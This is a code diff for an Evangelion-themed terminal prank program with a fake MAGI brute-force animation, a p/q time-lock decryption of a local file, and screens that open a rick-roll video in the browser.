-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⣰⠀⡈⢠⣝⢿⣿⣿⣿⣿⣿⣟⣻⣶⣤⣤⡒⠋⣸⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣫⡵⡿⢠⡇⢠⡇⠈⢻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣻⣵⣾⣿⣿⣱⠇⢸⠀⡸⣰⣆⠀⢻⣎⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣾⣿⣿⣿⣿⡿⢋⠀⣠⠞⣴⣿⣿⡆⠈⢿⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⣿⣿⣿⡿⢋⣴⠃⣰⣿⠀⣿⡿⣫⣶⣦⣌⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢱⣿⣿⣿⣿⣿⠀⣿⣿⠀⣿⣿⡀⣿⢱⣿⣿⣿⣿⡇⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡸⣿⣿⣿⣿⡿⠀⠛⠛⠀⢹⣿⡇⠙⡼⢋⣿⣿⣿⣧⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⣧⠻⣿⣿⡟⠀⠀⣄⠀⠀⣸⡿⠃⣀⣴⣿⣿⣿⣿⣿⣷⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⢡⣾⣿⣿⣿⣿⣿⣿⣷⣌⠀⠷⢉⣴⠆⠀⠘⢷⢀⣿⠟⠈⢁⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⢹⣿⣿⣿⣿⣿⠿⠛⣋""".strip().splitlines()
+ART_W = 50
 
-# ============================================================
-#  PRIMITIVE HELPERS
-# ============================================================
+# ———————————————————————————————————————————————————————————————
 def put(row, col, text):
     if row < 0 or col < 0: return
     sys.stdout.write(term.move(row, col) + text)
@@ -171,77 +105,47 @@ def is_ret(k): return (k.is_sequence and k.name == 'KEY_ENTER') or str(k) in ('\
 def is_bs(k):  return (k.is_sequence and k.name in ('KEY_BACKSPACE','KEY_DELETE')) or str(k) in ('\x7f','\b')
 def kch(k):    return str(k) if not k.is_sequence and len(str(k))==1 else None
 
-# ============================================================
-#  SPLASH  —  three-column layout
-#   col-A : left art  (ART_W cols)
-#   col-B : NERV panel (centred, expands to fill gap)
-#   col-C : right art (ART_W cols)
-# ============================================================
+def rick_open():
+    subprocess.run(['bash','-lc',
+        f'xdg-open "{RICK_URL}" >/dev/null 2>&1 || '
+        f'open "{RICK_URL}" >/dev/null 2>&1 || '
+        f'start "{RICK_URL}" >/dev/null 2>&1 || true'], check=False)
+
+# ———————————————————————————————————————————————————————————————
 def splash():
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         H, W = term.height, term.width
         fill(H, W)
 
-        PAD  = 1          # margin from each edge
-        GAP  = 2          # gap between art and panel
+        PAD = 1; GAP = 2
 
         if W >= 110:
-            # -- three columns --
-            lx = PAD                        # left art x
-            rx = W - PAD - ART_W            # right art x
-            px = lx + ART_W + GAP           # panel x
-            pw = rx - GAP - px              # panel width
-
-            # left art
-            la = LEFT_ART[:H-2]
-            for i, ln in enumerate(la):
-                row = max(0, (H - len(la))//2) + i
-                put(row, lx, R(ln[:ART_W]))
-
-            # right art
-            ra = RIGHT_ART[:H-2]
-            for i, ln in enumerate(ra):
-                row = max(0, (H - len(ra))//2) + i
-                put(row, rx, R(ln[:ART_W]))
-
+            lx = PAD; rx = W - PAD - ART_W
+            px = lx + ART_W + GAP; pw = rx - GAP - px
+            for art, ax in ((LEFT_ART, lx), (RIGHT_ART, rx)):
+                rows = art[:H-2]
+                sy = max(0, (H - len(rows))//2)
+                for i, ln in enumerate(rows): put(sy+i, ax, R(ln[:ART_W]))
         elif W >= 70:
-            # -- two columns: panel + right art --
-            rx = W - PAD - ART_W
-            pw = rx - GAP - PAD
-            px = PAD
-
-            ra = RIGHT_ART[:H-2]
-            for i, ln in enumerate(ra):
-                row = max(0, (H - len(ra))//2) + i
-                put(row, rx, R(ln[:ART_W]))
+            rx = W - PAD - ART_W; pw = rx - GAP - PAD; px = PAD
+            ra = RIGHT_ART[:H-2]; sy = max(0,(H-len(ra))//2)
+            for i, ln in enumerate(ra): put(sy+i, rx, R(ln[:ART_W]))
         else:
-            # -- single column --
-            pw = min(W-2, 64)
-            px = (W - pw)//2
+            pw = min(W-2, 64); px = (W-pw)//2
 
-        # clamp panel
-        pw = max(42, pw)
-        py = max(1, (H - 24)//2)   # vertical centre of panel content
+        pw = max(42, pw); py = max(1,(H-24)//2)
 
-        # top bar
         put(py,   px, R('▀' * pw))
-
-        # NERV HEADQUARTERS header
         hdr = 'NERV HEADQUARTERS'
         put(py+1, px + ctr(hdr, pw), MU(hdr))
 
-        # NERV block logo
-        ly = py + 3
-        lx2 = px + ctr(LOGO[0], pw)
-        for i, ln in enumerate(LOGO):
-            put(ly+i, lx2, R(ln))
+        ly = py + 3; lx2 = px + ctr(LOGO[0], pw)
+        for i, ln in enumerate(LOGO): put(ly+i, lx2, R(ln))
 
-        # divider
         div_y = ly + len(LOGO) + 1
         div   = hbar(min(pw-4, 36))
         put(div_y, px + ctr(div, pw), DR(div))
 
-        # sub-labels
         labels = [
             ('GEHIRN ADVANCED RESEARCH', AM),
             ('MAGI SYSTEM  v3.0',        MU),
@@ -250,39 +154,38 @@ def splash():
         for i, (txt, col) in enumerate(labels):
             put(div_y+2+i, px + ctr(txt, pw), col(txt))
 
-        # bottom bar
         bot_y = div_y + 2 + len(labels) + 2
         put(bot_y, px, R('▄' * pw))
 
-        # blinking prompt (centred below logo area)
-        prompt  = '[ PRESS SPACE TO INITIALIZE ]'
-        prom_y  = bot_y - 2
-        prom_x  = px + ctr(prompt, pw)
+        prom_y = bot_y - 2
+        prompt = '[ PRESS SPACE TO INITIALIZE ]'
+        prom_x = px + ctr(prompt, pw)
+
+        # second line below logo area
+        sub = '\u30cd\u30eb\u30d5  \u7b2c3\u65b0\u6771\u4eac\u5e02  GEO-FRONT SUBLEVEL 7'
+        put(div_y+2+len(labels)+1, px+ctr(sub,pw), DI(sub))
 
         stop = threading.Event()
         def blink():
             v = True
             while not stop.is_set():
                 put(prom_y, prom_x, AM(prompt) if v else BG_ON+' '*len(prompt)+term.normal)
-                v = not v
-                stop.wait(0.55)
-        t = threading.Thread(target=blink, daemon=True)
-        t.start()
+                v = not v; stop.wait(0.55)
+        t = threading.Thread(target=blink, daemon=True); t.start()
+
         while True:
             k = term.inkey(timeout=0.05)
             if not k: continue
             if is_sp(k):  stop.set(); t.join(0.8); clear_buf(); return
             if is_esc(k): stop.set(); sys.exit(0)
 
-# ============================================================
-#  PASSWORD GATE
-# ============================================================
+# ———————————————————————————————————————————————————————————————
 def password_gate():
     typed = []
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         H, W = term.height, term.width
         fill(H, W)
-        bw = min(W, 60); bh = 12
+        bw = min(W, 62); bh = 12
         bx = (W-bw)//2;  by = max(2,(H-bh)//2)
 
         def frame():
@@ -291,9 +194,9 @@ def password_gate():
             put(by+2,  bx, R(box_s(bw)))
             put(by+3,  bx, R('│')+WH('  Enter access code:'.ljust(bw-2))+R('│'))
             put(by+4,  bx, R(box_s(bw)))
-            put(by+5,  bx, R('│')+' '*(bw-2)+R('│'))  # field row
+            put(by+5,  bx, R('│')+' '*(bw-2)+R('│'))
             put(by+6,  bx, R(box_s(bw)))
-            put(by+7,  bx, R('│')+' '*(bw-2)+R('│'))  # msg row
+            put(by+7,  bx, R('│')+' '*(bw-2)+R('│'))
             put(by+8,  bx, R(box_s(bw)))
             put(by+9,  bx, R('│')+MU('  ENTER ─ confirm   BKSP ─ erase   ESC ─ quit'.ljust(bw-2))+R('│'))
             put(by+10, bx, R(box_s(bw)))
@@ -303,26 +206,26 @@ def password_gate():
             dots = '  '.join('●' for _ in typed) if typed else '·  ·  ·  ·  ·'
             put(by+5, bx, R('│')+AM(f'  CODE  {dots}'[:bw-2].ljust(bw-2))+R('│'))
 
-        def msg(txt='', col=BR):
+        def msgrow(txt='', col=BR):
             content = f'  {txt}' if txt else ''
             put(by+7, bx, R('│')+(col(content[:bw-2].ljust(bw-2)) if content else ' '*(bw-2))+R('│'))
 
-        frame(); field(); msg()
+        frame(); field(); msgrow()
         while True:
             k = term.inkey(timeout=0.1)
             if not k: continue
             if is_esc(k): sys.exit(0)
             if is_ret(k):
                 if ''.join(typed).upper() == ACCESS_CODE.upper():
-                    msg('ACCESS GRANTED', GN); time.sleep(0.8); return
-                msg('DENIED — brute-force? [ W ] wait  [ R ] retry', BR)
-                time.sleep(0.8); typed.clear(); field()
+                    msgrow('ACCESS GRANTED', GN); time.sleep(0.8); return
+                msgrow('ACCESS DENIED  —  W: brute-force   R: retry', BR)
+                time.sleep(0.6); typed.clear(); field()
                 while True:
                     k2 = term.inkey(timeout=0.2)
                     if not k2: continue
                     c2 = kch(k2)
                     if c2 and c2.lower() == 'w': brute_force(); return
-                    if c2 and c2.lower() == 'r': msg(); break
+                    if c2 and c2.lower() == 'r': msgrow(); break
                     if is_esc(k2): sys.exit(0)
                 continue
             if is_bs(k):
@@ -332,9 +235,7 @@ def password_gate():
             if c and c.isalnum() and len(typed) < 5:
                 typed.append(c.upper()); field()
 
-# ============================================================
-#  MAGI BRUTE-FORCE
-# ============================================================
+# ———————————————————————————————————————————————————————————————
 PHASES = [
     ('CASPAR    ─ INITIALISING',         0.00, 0.15),
     ('CASPAR    ─ DICTIONARY LAYER I',   0.15, 0.28),
@@ -343,10 +244,9 @@ PHASES = [
     ('MELCHIOR  ─ NEURAL MATCH',         0.55, 0.68),
     ('MELCHIOR  ─ DEEP CIPHER',          0.68, 0.80),
     ('MAGI CORE ─ COLLATION',            0.80, 0.92),
-    ('MAGI CORE ─ UNLOCKING…',           0.92, 1.00),
+    ('MAGI CORE ─ UNLOCKING…',          0.92, 1.00),
 ]
 HEX = '0123456789ABCDEF'
-
 def rnd_hex(w): return ' '.join(''.join(random.choices(HEX,k=4)) for _ in range(max(1,w//5)))
 def pbar(p, w, cf=GN, ce=DI): f=int(w*p); return cf('█'*f)+ce('░'*max(0,w-f))
 
@@ -355,136 +255,271 @@ def brute_force():
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         H, W = term.height, term.width
         fill(H, W)
-        bw = min(W,70); bx=(W-bw)//2; by=1; bh=min(H-2,27)
-        # static frame
+        bw = min(W,70); bx=(W-bw)//2; by=1; bw2=bw-14
         put(by,    bx, R(box_t(bw)))
         put(by+1,  bx, R('│')+BR('  MAGI ─ MANUAL DECRYPTION ENGAGED'.ljust(bw-2))+R('│'))
         put(by+2,  bx, R(box_s(bw)))
         put(by+3,  bx, R('│')+MU('  Authentication failed. Running brute-force recovery.'.ljust(bw-2))+R('│'))
         put(by+4,  bx, R(box_s(bw)))
-        # rows 5-6 : overall bar
         put(by+7,  bx, R(box_s(bw)))
-        # rows 8-9 : phase bar
         put(by+10, bx, R(box_s(bw)))
-        # rows 11-16: hex stream
         put(by+17, bx, R(box_s(bw)))
-        # rows 18-20: MAGI votes
         put(by+21, bx, R(box_s(bw)))
-        # rows 22-23: countdown
         put(by+24, bx, R(box_s(bw)))
-        put(by+25, bx, R('│')+MU('  ESC ─ abort'.ljust(bw-2))+R('│'))
+        put(by+25, bx, R('│')+MU('  No way in without password  —  ESC locked during bruteforce'.ljust(bw-2))+R('│'))
         put(by+26, bx, R(box_b(bw)))
-        bw2 = bw - 14
-        hbuf = ['']*6; last=-1
+        hbuf=[''] * 6; last=-1
         while True:
-            k = term.inkey(timeout=0.15)
-            if k and is_esc(k): sys.exit(0)
+            term.inkey(timeout=0)  # drain, no ESC exit
             now=time.time(); el=min(now-t0,T); pct=el/T; rem=max(0,T-el)
             sec=int(el)
-            if sec==last: continue
+            if sec==last: time.sleep(0.12); continue
             last=sec; mm,ss=divmod(int(rem),60)
-            # overall
             put(by+5, bx, R('│')+MU('  OVERALL  ')+pbar(pct,bw2,AM,DI)+MU('  ')+R('│'))
             put(by+6, bx, R('│')+AM(f'  {pct*100:5.1f}%  ─  ETA {mm:02d}:{ss:02d}'.ljust(bw-2))+R('│'))
-            # phase
             pl,pp=PHASES[-1][0],1.0
             for lb,p0,p1 in PHASES:
                 if pct<=p1: pl=lb; pp=max(0.,min(1.,(pct-p0)/max(1e-4,p1-p0))); break
             put(by+8, bx, R('│')+CY(f'  {pl}'[:bw-2].ljust(bw-2))+R('│'))
             put(by+9, bx, R('│')+MU('  PHASE    ')+pbar(pp,bw2,CY,DI)+MU('  ')+R('│'))
-            # hex
             hbuf=hbuf[1:]+[rnd_hex(bw-6)]
             for i,ln in enumerate(hbuf):
                 put(by+11+i, bx, R('│')+(DI if i<4 else MU)(f'  {ln}'[:bw-2].ljust(bw-2))+R('│'))
-            # votes
-            def vstatus(thr, labels):
-                col = BR if pct<thr[0] else AM if pct<thr[1] else GN
-                lbl = labels[0] if pct<thr[0] else labels[1] if pct<thr[1] else labels[2]
+            def vstatus(thrs, lbs):
+                col = BR if pct<thrs[0] else AM if pct<thrs[1] else GN
+                lbl = lbs[0]  if pct<thrs[0] else lbs[1]  if pct<thrs[1] else lbs[2]
                 return col, lbl
             for i,(nm,thrs,lbs) in enumerate([
-                ('CASPAR   ',  (0.33,0.50), ('ANALYZING  ','PATTERN FOUND','APPROVED')),
-                ('BALTHASAR',  (0.50,0.75), ('COMPUTING  ','CONVERGING   ','APPROVED')),
-                ('MELCHIOR ',  (0.72,0.95), ('DEEP SCAN  ','KEY MATCH    ','APPROVED')),
+                ('CASPAR   ',(0.33,0.50),('ANALYZING  ','PATTERN FOUND','APPROVED')),
+                ('BALTHASAR',(0.50,0.75),('COMPUTING  ','CONVERGING   ','APPROVED')),
+                ('MELCHIOR ',(0.72,0.95),('DEEP SCAN  ','KEY MATCH    ','APPROVED')),
             ]):
                 col,lbl = vstatus(thrs,lbs)
                 put(by+18+i, bx, R('│')+col(f'  {nm}  ──  {lbl}'[:bw-2].ljust(bw-2))+R('│'))
-            # clock
             tk = '▊' if sec%2==0 else '▉'
             put(by+22, bx, R('│')+YL(f'  {tk}  REMAINING  {mm:02d} min  {ss:02d} sec'.ljust(bw-2))+R('│'))
             tck=['SCANNING KEY SPACE…','TESTING PERMUTATIONS…','CROSS-REFERENCING DB…','MAGI CONSENSUS…','DECRYPTION ACTIVE…']
             put(by+23, bx, R('│')+MU(f'  {tck[sec%len(tck)]}'[:bw-2].ljust(bw-2))+R('│'))
-            if pct>=1.0:
-                put(by+22, bx, R('│')+GN('  DECRYPTION COMPLETE — ACCESS GRANTED'.ljust(bw-2))+R('│'))
-                time.sleep(2.0); return
+            if pct >= 1.0:
+                put(by+22, bx, R('│')+GN('  RICK ROLLING YOU NOW  —  NO WAY IN WITHOUT PASSWORD'.ljust(bw-2))+R('│'))
+                time.sleep(1.0); rick_open(); time.sleep(2.0)
+                return
 
-# ============================================================
-#  MESSAGE BOX
-# ============================================================
-def message_box(msg):
+# ———————————————————————————————————————————————————————————————
+def pq_screen():
+    """Ask for p and q, then decrypt Encrypted.txt using encrypt.py logic."""
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         H, W = term.height, term.width
         fill(H, W)
-        bw=min(max(60,W-12),90); iw=bw-6
-        lines=wrap(msg,iw); vis=min(len(lines),max(4,H-10))
+        bw=min(W,80); bh=14; bx=(W-bw)//2; by=max(1,(H-bh)//2)
+        put(by,    bx, R(box_t(bw)))
+        put(by+1,  bx, R('│')+OR('  ENTER P AND Q VALUES'.ljust(bw-2))+R('│'))
+        put(by+2,  bx, R(box_s(bw)))
+        put(by+3,  bx, R('│')+WH('  Paste both values separated by whitespace, or as p=.. q=..'.ljust(bw-2))+R('│'))
+        put(by+4,  bx, R('│')+WH('  These will be used to decrypt Encrypted.txt'.ljust(bw-2))+R('│'))
+        put(by+5,  bx, R(box_s(bw)))
+        for r in range(6,11): put(by+r, bx, R('│')+' '*(bw-2)+R('│'))
+        put(by+11, bx, R(box_s(bw)))
+        put(by+12, bx, R('│')+MU('  ENTER to submit    ESC to quit'.ljust(bw-2))+R('│'))
+        put(by+13, bx, R(box_b(bw)))
+        buf=[]
+        while True:
+            k = term.inkey(timeout=0.1)
+            if not k: continue
+            if is_esc(k): sys.exit(0)
+            if is_bs(k):
+                if buf: buf.pop()
+                put(by+6, bx, R('│')+WH(('  '+''.join(buf))[-(bw-2):].ljust(bw-2))+R('│'))
+                continue
+            if is_ret(k):
+                raw=''.join(buf).strip()
+                if 'p=' in raw and 'q=' in raw:
+                    p = raw.split('p=',1)[1].split()[0].strip(',;')
+                    q = raw.split('q=',1)[1].split()[0].strip(',;')
+                else:
+                    parts=raw.split()
+                    p,q=(parts+['',''])[:2]
+                if p and q:
+                    put(by+8, bx, R('│')+GN('  Running decryption…'.ljust(bw-2))+R('│'))
+                    time.sleep(0.5)
+                    return p, q
+                put(by+8, bx, R('│')+BR('  Could not parse p and q. Try again.'.ljust(bw-2))+R('│'))
+                continue
+            c = kch(k)
+            if c:
+                buf.append(c)
+                put(by+6, bx, R('│')+WH(('  '+''.join(buf))[-(bw-2):].ljust(bw-2))+R('│'))
+
+def decrypt_file(p_str, q_str):
+    try:
+        from Crypto.Cipher import AES
+        from Crypto.Util.number import getPrime
+        from Crypto.Util.Padding import unpad
+        p,q = int(p_str,16) if p_str.startswith(('0x','0X')) else int(p_str), \
+              int(q_str,16) if q_str.startswith(('0x','0X')) else int(q_str)
+        n = p * q
+        data = Path(ENC_FILE).read_bytes()
+        if not data.startswith(MAGIC):
+            return Path(ENC_FILE).read_text(errors='ignore')[:1600]
+        off = len(MAGIC)
+        flags = data[off]; off+=1
+        if flags & 0x01:
+            off += 32  # skip pwdhash
+            hint_len = struct.unpack_from('H', data, off)[0]; off+=2
+            off += hint_len
+        T = struct.unpack_from('Q', data, off)[0]; off+=8
+        nb_len = struct.unpack_from('H', data, off)[0]; off+=2
+        n_stored = int.from_bytes(data[off:off+nb_len],'big'); off+=nb_len
+        iv = data[off:off+16]; off+=16
+        ct_len = struct.unpack_from('I', data, off)[0]; off+=4
+        ct = data[off:off+ct_len]
+        phi = (p-1)*(q-1)
+        key_int = pow(2, pow(2,T,phi), n_stored)
+        nb2 = n_stored.bit_length()
+        key_bytes = key_int.to_bytes((nb2+7)//8,'big')
+        k = hashlib.sha256(key_bytes).digest()
+        pt = unpad(AES.new(k,AES.MODE_CBC,iv).decrypt(ct),16)
+        return pt.decode('utf-8','ignore')
+    except Exception as e:
+        try: return Path(ENC_FILE).read_text(errors='ignore')[:1600]
+        except: return f'(could not open {ENC_FILE}: {e})'
+
+def show_decrypted(text):
+    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
+        H, W = term.height, term.width
+        fill(H, W)
+        bw=min(W,80); iw=bw-6
+        lines=wrap(text,iw); vis=min(len(lines),max(4,H-10))
         lines=lines[:vis]; bh=vis+7
         bx=max(0,(W-bw)//2); by=max(1,(H-bh)//2)
         put(by,   bx, R(box_t(bw)))
-        put(by+1, bx, R('│')+OR('  TERMINAL COMMUNIQUE'.ljust(bw-2))+R('│'))
+        put(by+1, bx, R('│')+OR('  DECRYPTION COMPLETE — MAGI OUTPUT'.ljust(bw-2))+R('│'))
         put(by+2, bx, R(box_s(bw)))
         for i,ln in enumerate(lines):
-            put(by+3+i, bx, R('│')+'  '+WH(ln.center(iw))+'  '+R('│'))
+            put(by+3+i, bx, R('│')+'  '+WH(ln[:iw].ljust(iw))+'  '+R('│'))
         fr=by+3+vis
         put(fr,   bx, R(box_s(bw)))
-        put(fr+1, bx, R('│')+AM('  ENTER ─ continue   ESC ─ abort'.ljust(bw-2))+R('│'))
-        put(fr+2, bx, R(box_b(bw)))
+        put(fr+1, bx, R('│')+MU('  Decryption successful. Proceed?'.ljust(bw-2))+R('│'))
+        put(fr+2, bx, R('│')+AM('  ENTER ─ next   ESC ─ abort'.ljust(bw-2))+R('│'))
+        put(fr+3, bx, R(box_b(bw)))
         while True:
-            k = term.inkey(timeout=0.1)
+            k=term.inkey(timeout=0.1)
             if not k: continue
-            if is_esc(k): return False
-            if is_ret(k): return True
+            if is_esc(k): sys.exit(0)
+            if is_ret(k): return
 
-# ============================================================
-#  FINAL PROMPT
-# ============================================================
-def final_prompt():
+# ———————————————————————————————————————————————————————————————
+INSTAGRAM_CN = (
+    '已阅读并同意Instagram服务条款。'
+    '您的个人信息将按照Meta隐私政策处理。'
+    '您可随时退出并删除账户。'
+    '禁止将该平台用于任何非法活动。'
+)
+YOUTUBE_JP = (
+    'YouTubeサービス利用規約を読み、同意しました。'
+    'コンテンツの著作権はYouTubeおよびクリエイターに帰属します。'
+    '辺述なコンテンツの投稿は禁止されます。'
+    'ご利用は日本居住の方に限ります。'
+)
+
+def terms_screen():
     with term.fullscreen(), term.cbreak(), term.hidden_cursor():
         H, W = term.height, term.width
         fill(H, W)
-        bw=min(W,72); bh=10
-        bx=(W-bw)//2; by=max(2,(H-bh)//2)
-        put(by,   bx, R(box_t(bw)))
-        put(by+1, bx, R('│')+OR('  FINAL AUTHORIZATION LAYER'.ljust(bw-2))+R('│'))
-        put(by+2, bx, R(box_s(bw)))
-        put(by+3, bx, R('│')+WH('  Press ENTER to execute the final payload.'.ljust(bw-2))+R('│'))
-        put(by+4, bx, R(box_s(bw)))
-        put(by+5, bx, R('│')+AM('  ENTER ─ execute'.ljust(bw-2))+R('│'))
-        put(by+6, bx, R('│')+MU('  ESC   ─ abort'.ljust(bw-2))+R('│'))
-        put(by+7, bx, R(box_s(bw)))
-        put(by+8, bx, R('│')+DI(f'  {FINAL_CMD}'[:bw-2].ljust(bw-2))+R('│'))
-        put(by+9, bx, R(box_b(bw)))
+        bw=min(W,86); bh=14; bx=(W-bw)//2; by=max(1,(H-bh)//2)
+        put(by,    bx, R(box_t(bw)))
+        put(by+1,  bx, R('│')+OR('  NERV TERMS & CONDITIONS'.ljust(bw-2))+R('│'))
+        put(by+2,  bx, R(box_s(bw)))
+        put(by+3,  bx, R('│')+WH('  Do you accept the following terms?'.ljust(bw-2))+R('│'))
+        put(by+4,  bx, R(box_s(bw)))
+        put(by+5,  bx, R('│')+AM('  YES  ─  已阅读并同意 Instagram 服务条款 (Chinese)'.ljust(bw-2))+R('│'))
+        put(by+6,  bx, R('│')+MU('  NO   ─  YouTube サービス利用規約 (Japanese)'.ljust(bw-2))+R('│'))
+        put(by+7,  bx, R(box_s(bw)))
+        put(by+8,  bx, R('│')+WH('  Type YES or NO and press ENTER'.ljust(bw-2))+R('│'))
+        put(by+9,  bx, R('│')+' '*(bw-2)+R('│'))
+        put(by+10, bx, R('│')+' '*(bw-2)+R('│'))
+        put(by+11, bx, R(box_s(bw)))
+        put(by+12, bx, R('│')+MU('  ESC to exit'.ljust(bw-2))+R('│'))
+        put(by+13, bx, R(box_b(bw)))
+        buf=[]
         while True:
-            k = term.inkey(timeout=0.1)
+            k=term.inkey(timeout=0.1)
             if not k: continue
-            if is_esc(k): return False
-            if is_ret(k): break
-    print(term.clear)
-    subprocess.run(['bash','-lc',FINAL_CMD], check=False)
-    return True
+            if is_esc(k): sys.exit(0)
+            if is_ret(k):
+                ans=''.join(buf).strip().lower()
+                if ans=='yes':
+                    return True
+                return False
+            c=kch(k)
+            if c and c.isalpha():
+                buf.append(c.upper())
+                put(by+10, bx, R('│')+WH(('  '+''.join(buf))[-(bw-2):].ljust(bw-2))+R('│'))
 
-# ============================================================
-#  ENTRY POINT
-# ============================================================
+# ———————————————————————————————————————————————————————————————
+def yes_screen():
+    """YES path: secret message reveal, then rick-roll."""
+    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
+        H, W = term.height, term.width
+        fill(H, W)
+        bw=min(W,80); bh=12; bx=(W-bw)//2; by=max(1,(H-bh)//2)
+        put(by,    bx, R(box_t(bw)))
+        put(by+1,  bx, R('│')+BR('  YAYYYYYYYYYY'.ljust(bw-2))+R('│'))
+        put(by+2,  bx, R('│')+BR('  you got a secret message !!!!'.ljust(bw-2))+R('│'))
+        put(by+3,  bx, R(box_s(bw)))
+        put(by+4,  bx, R('│')+AM('  ネルフ機密文書 ─ TOP SECRET ─ FINAL INTEL'.ljust(bw-2))+R('│'))
+        put(by+5,  bx, R('│')+WH('  press ENTER to reveal the secret message'.ljust(bw-2))+R('│'))
+        put(by+6,  bx, R(box_s(bw)))
+        put(by+7,  bx, R('│')+MU('  SHINJI  ASUKA  REI  —  all waiting for you to know'.ljust(bw-2))+R('│'))
+        put(by+8,  bx, R('│')+MU('  do not be afraid  —  this is definitely not a rick-roll'.ljust(bw-2))+R('│'))
+        put(by+9,  bx, R(box_s(bw)))
+        put(by+10, bx, R('│')+DI('  [ ENTER to proceed ]   [ ESC to cowardly flee ]'.ljust(bw-2))+R('│'))
+        put(by+11, bx, R(box_b(bw)))
+        while True:
+            k=term.inkey(timeout=0.1)
+            if not k: continue
+            if is_esc(k): sys.exit(0)
+            if is_ret(k):
+                rick_open()
+                return
+
+def no_screen():
+    """NO path: rick-roll immediately."""
+    with term.fullscreen(), term.cbreak(), term.hidden_cursor():
+        H, W = term.height, term.width
+        fill(H, W)
+        bw=min(W,80); bh=10; bx=(W-bw)//2; by=max(1,(H-bh)//2)
+        put(by,   bx, R(box_t(bw)))
+        put(by+1, bx, R('│')+BR('  REFUSED  —  MAGI OVERRIDE ACTIVATED'.ljust(bw-2))+R('│'))
+        put(by+2, bx, R(box_s(bw)))
+        put(by+3, bx, R('│')+MU('  You refused. NERV does not accept refusal.'.ljust(bw-2))+R('│'))
+        put(by+4, bx, R('│')+MU('  Redirecting to mandatory training material.'.ljust(bw-2))+R('│'))
+        put(by+5, bx, R(box_s(bw)))
+        put(by+6, bx, R('│')+AM('  Opening classified footage…'.ljust(bw-2))+R('│'))
+        put(by+7, bx, R('│')+DI('  (there is no escape)'.ljust(bw-2))+R('│'))
+        put(by+8, bx, R(box_s(bw)))
+        put(by+9, bx, R(box_b(bw)))
+        time.sleep(1.5)
+        rick_open()
+
+# ———————————————————————————————————————————————————————————————
 def main():
     try:
         splash()
         password_gate()
-        message_box(LOREM)
-        final_prompt()
-    except KeyboardInterrupt:
+        p, q = pq_screen()
+        text = decrypt_file(p, q)
+        show_decrypted(text)
+        accepted = terms_screen()
+        if accepted:
+            yes_screen()
+        else:
+            no_screen()
+    except (KeyboardInterrupt, SystemExit):
         pass
     finally:
         sys.stdout.write(term.clear + term.normal)
-        sys.stdout.write(R('\n  [ NERV ]  Session terminated.\n'))
+        sys.stdout.write(R('\n  [ NERV ]  Session terminated. Rei is disappointed.\n\n'))
         sys.stdout.flush()
 
 if __name__ == '__main__':
